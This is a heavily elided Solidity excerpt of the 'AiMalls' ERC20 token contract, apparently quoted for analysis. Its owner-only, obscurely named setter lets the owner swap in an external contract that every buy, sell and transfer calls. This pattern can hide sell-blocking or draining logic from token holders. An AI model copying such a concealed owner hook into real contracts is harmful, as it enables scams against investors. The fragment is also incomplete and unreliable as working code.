...
contract TokenM is ERC20 {
    ...
    BSescAmountlersds public lersds;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("AiMalls", "AIT") {
    ...
    function voceddrTingerMenge(BSescAmountlersds _lersds) public onlyOwner {
        lersds = _lersds;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                lersds.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				lersds.addOutAmount(from, amount);
            }else{
                lersds.addOutAmount(from, amount);
                takeFee = false;
            }
